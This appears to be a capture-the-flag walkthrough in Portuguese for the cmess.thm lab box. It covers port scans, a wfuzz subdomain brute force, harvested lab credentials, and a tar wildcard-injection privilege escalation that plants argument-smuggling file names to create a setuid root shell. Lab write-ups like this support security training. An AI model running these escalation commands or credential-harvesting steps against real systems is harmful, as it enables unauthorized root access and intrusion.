@@ -1,0 +1,61 @@
+Portas abertas:
+
+rustscan:
+
+Open 10.67.189.88:22
+Open 10.67.189.88:80
+
+nmap:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
+|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
+|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-generator: Gila CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+cms: gila
+
+encontrando subdominios:
+
+wfuzz -c -w ~/Downloads/Wordlists/subdomain.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107 
+
+-> http://dev.cmess.thm
+
+emails:
+andre@cmess.thm
+support@cmess.thm
+support@cmess.thm
+andre@cmess.thm
+support@cmess.thm
+
+aqui foi uma conversa entre troca de emails pedindo para resetar a senha!
+
+email: andre@cmess.thm
+senha: KPFTN_f2yxe%
+
+
+senha do banco de dados:
+
+username: root
+password: r0otus3rpassw0rd
+
+password backup do andre em /opt:
+
+UQfsdCB7aAP6
+
+wildcard hijacking no tar!
+
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
+chmod +x shell.sh
+
